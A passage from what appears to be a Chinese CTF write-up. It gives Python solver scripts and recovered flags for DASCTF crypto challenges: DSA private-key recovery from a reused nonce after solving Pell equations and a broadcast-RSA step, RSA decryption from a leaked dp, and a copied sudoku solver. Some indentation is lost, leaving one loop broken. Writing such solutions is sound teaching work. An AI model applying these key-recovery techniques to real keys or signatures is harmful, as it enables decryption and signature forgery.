encrypt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[3912956711, 4013184893, 3260747771], [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424], [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842]</span></span><br><span class="line"><span class="string">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859, 106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198, 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line"><span class="string">498841194617327650445431051685964174399227739376, 376599166921876118994132185660203151983500670896, 187705159843973102963593151204361139335048329243</span></span><br><span class="line"><span class="string">620827881415493136309071302986914844220776856282, 674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>dsa部分是最基本的形式，就差H(m1)和H(m2)</p><p>m1和m2经过三次RSA加密，但模数未知</p><p>模数由佩尔方程解出，再用低指数广播可拿到m^7，开根即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n,k,t = <span class="number">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859</span>, <span class="number">106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198</span>, <span class="number">60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line">wl, cl1, cl2 =[<span class="number">3912956711</span>, <span class="number">4013184893</span>, <span class="number">3260747771</span>], [<span class="number">2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704</span>, <span class="number">21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961</span>, <span class="number">301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424</span>], [<span class="number">148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144</span>, <span class="number">1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256</span>, <span class="number">10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842</span>]</span><br><span class="line"></span><br><span class="line">q = <span class="number">895513916279543445314258868563331268261201605181</span></span><br><span class="line">p = k*q + <span class="number">1</span></span><br><span class="line">g = <span class="number">8065494126227608731057119338486910291529176576096612311734285061607284964658737003594964324046804258074712614189778906098614765392123515385260406254416427321997510822217750260108595410657401</span></span><br><span class="line"></span><br><span class="line">r1, s1, s2  = <span class="number">498841194617327650445431051685964174399227739376</span>, <span class="number">376599166921876118994132185660203151983500670896</span>, <span class="number">187705159843973102963593151204361139335048329243</span></span><br><span class="line">r2, s3 = <span class="number">620827881415493136309071302986914844220776856282</span>, <span class="number">674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span></span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line"></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">ul = []</span><br><span class="line">vl = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(wl)):</span><br><span class="line">    uli,vli = solve_pell(wl[i])</span><br><span class="line">    ul.append(uli)</span><br><span class="line">    vl.append(vli)</span><br><span class="line">    <span class="built_in">print</span>(uli**<span class="number">2</span> - wl[i]* vli**<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">m1 = crt(cl1,ul)</span><br><span class="line">m2 = crt(cl2,vl)</span><br><span class="line">m1 = iroot(m1,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m2 = iroot(m2,<span class="number">7</span>)[<span class="number">0</span>]</span><br><span class="line">m1 = long_to_bytes(m1)</span><br><span class="line">m2 = long_to_bytes(m2)</span><br><span class="line">hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line"></span><br><span class="line">k = (hm1-hm2) * invert(s1-s2,q) % q</span><br><span class="line">x = (s1*k-hm1) * invert(r1,q) %q</span><br><span class="line">x1 = long_to_bytes(x)</span><br><span class="line"></span><br><span class="line">x2 = (s3*k-hm1) * invert(r2,q) %q</span><br><span class="line">x2 = long_to_bytes(x2)</span><br><span class="line"><span class="built_in">print</span>(x1+x2)</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;f11bad18f529750fe52c56eed85d001b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="hardrsa"><a href="#hardrsa" class="headerlink" title="hardrsa"></a>hardrsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">4</span>*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = gmpy2.lcm(p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">dp = d % (p - <span class="number">1</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;dp = &quot;</span> + <span class="built_in">str</span>(dp))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line"></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">x = <span class="number">2019</span>*p**<span class="number">2</span> + <span class="number">2020</span>*p**<span class="number">3</span> + <span class="number">2021</span>*p**<span class="number">4</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(g, x, y)</span><br><span class="line"><span class="built_in">print</span>( <span class="string">&quot;c1 = &quot;</span> + <span class="built_in">str</span>(c1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br></pre></td></tr></table></figure><p>y-1光滑，可用离散对数解出x，然后Z3 Solver解出p，接着就是已知dp，p的模型，很容易就能做出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">y = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">c1 = <span class="number">78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">p = <span class="number">12131601165788024635030034921084070470053842112984866821070395281728468805072716002494427632757418621194662541766157553264889658892783635499016425528807741</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span></span><br><span class="line">dp = <span class="number">379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">mp1 = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp1, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">y = <span class="built_in">pow</span>(x * mp * (gmpy2.invert(e, p)), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">mp1 = mp1 + y</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mp1))</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;98d923h4344e3bf72f8775xy65tvftv5&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="密码人集合"><a href="#密码人集合" class="headerlink" title="密码人集合"></a>密码人集合</h1><p>yysy，前一部分给我看湿了，密码人平时还挺孤独的。</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2FJ5@Z%7BW%5DZ91X1FN6IO2CV.png" alt="img"></p><p>泪目</p><p>就做题而言不算困难，在网上抄个数独脚本就能出了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line">sys.setrecursionlimit(<span class="number">100000</span>) <span class="comment"># 发现python默认的递归深度是很有限的</span></span><br><span class="line">                              <span class="comment">#（默认是1000），因此当递归深度超过999的</span></span><br><span class="line">                              <span class="comment"># 样子，就会引发这样的一个异常。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_next</span>(<span class="params">m, x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：获得下一个空白格在数独中的坐标。       </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(y+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 下一个空白格和当前格在一行的情况</span></span><br><span class="line">        <span class="keyword">if</span> m[x][next_y] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> x, next_y</span><br><span class="line">    <span class="keyword">for</span> next_x <span class="keyword">in</span> <span class="built_in">range</span>(x+<span class="number">1</span>, <span class="number">9</span>):  <span class="comment"># 下一个空白格和当前格不在一行的情况</span></span><br><span class="line">        <span class="keyword">for</span> next_y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[next_x][next_y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> next_x, next_y</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span>               <span class="comment"># 若不存在下一个空白格，则返回 -1，-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">value</span>(<span class="params">m, x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：返回符合&quot;每个横排和竖排以及</span></span><br><span class="line"><span class="string">              九宫格内无相同数字&quot;这个条件的有效值。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span> </span><br><span class="line">    i, j = x//<span class="number">3</span>, y//<span class="number">3</span></span><br><span class="line">    grid = [m[i*<span class="number">3</span>+r][j*<span class="number">3</span>+c] <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    v = <span class="built_in">set</span>([x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>)]) - <span class="built_in">set</span>(grid) - <span class="built_in">set</span>(m[x]) - \</span><br><span class="line">        <span class="built_in">set</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(*m))[y])    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(v)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_pos</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：返回第一个空白格的位置坐标&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> m[x][y] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> x, y</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">False</span>  <span class="comment"># 若数独已完成，则返回 False, False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_sudoku</span>(<span class="params">m, x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; 功能：试着填写数独 &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> value(m, x, y):</span><br><span class="line">        m[x][y] = v</span><br><span class="line">        next_x, next_y = get_next(m, x, y)</span><br><span class="line">        <span class="keyword">if</span> next_y == -<span class="number">1</span>: <span class="comment"># 如果无下一个空白格</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = try_sudoku(m, next_x, next_y) <span class="comment"># 递归</span></span><br><span class="line">            <span class="keyword">if</span> end:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            m[x][y] = <span class="number">0</span> <span class="comment"># 在递归的过程中，如果数独没有解开，</span></span><br><span class="line">                        <span class="comment"># 则回溯到上一个空白格</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sudoku</span>(<span class="params">m</span>):</span>        </span><br><span class="line">    x, y = start_pos(m)</span><br><span class="line">    try_sudoku(m, x, y)</span><br><span class="line">    <span class="built_in">print</span>(m)     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = m = [</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    ]</span><br><span class="line">    sudoku(m)</span><br><span class="line">    a=[[<span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">6</span>], [<span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>], [<span class="number">7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">8</span>], [<span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">3</span>], [<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">9</span>], [<span class="number">5</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">4</span>, <span 